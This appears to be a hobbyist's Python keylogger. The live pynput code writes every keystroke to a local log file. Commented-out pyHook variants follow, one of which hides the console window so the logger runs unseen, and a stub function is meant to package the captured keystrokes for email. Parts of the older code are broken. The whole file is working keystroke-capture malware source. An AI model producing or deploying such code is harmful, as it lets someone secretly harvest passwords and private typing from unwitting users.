import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []
def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    #pass
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("C:\\eni\\python\\log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","") # borrar quotation marks
            if (k.find("space") > 0):
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
            #f.write(str(key))

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

"""import pyHook 
import sys 
import logging
import time
import datetime

#variable tiempo de espera
wait_seconds = 60
timeout = time.time() + wait_seconds 
#Variable que guarda la ruta y el nombre del archivo.
file_log = 'C:\\eni\\python\\klgr\\today.txt'

def OnKeyboardEvent(evento):
    logging.basicConfig(filename=file_log, level=logging.DEBUG,format = '%(message)s')
    logging_log(10, chr(event.Ascii))
    return True

def TimeOut():
    if time.time()> timeout:
          return True
    else:
          return False

def FormatAndSendLogEmail():
    
    with open(file_log, 'r+')as f:
        actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read().replace('\n', '')
        data = 'log capturado a las: '+ actualdate + '\n' + data

hooks_manager = pyHook.HookManager() 
hooks_manager.KeyDown = OnKeyboardEvent 
hooks_manager.HookKeyboard() 

while True:
    FormatAndSendLogEmail()
    Timeout=time.time() + wait_seconds

#pythoncom.PumpWaitingMessages()

import win32api
import win32console
import win32gui
import pythoncom, pyHook


win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

def OnKeyboardEvent(event): 
    if event.Ascii==5: 
        _exit(1) 
    if event.Ascii !=0 or 8: 
    #4 the  ones right now
        f = open('C:\\eni\\python\\klgr\\today.txt', 'r+') 
        buffer = f.read() 
        f.close() 
    # 4 the consequents 
        f = open('C:\\eni\\python\\klgr\\today.txt', 'w') 
        keylogs = chr(event.Ascii) 
        if event.Ascii == 13: 
          keylogs = '/n'
          buffer += keylogs 
        f.write(buffer) 
        f.close() 
# create manager
hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent 
# set the hook 
hm.HookKeyboard() 
# wait forever 
pythoncom.PumpMessages() 
"""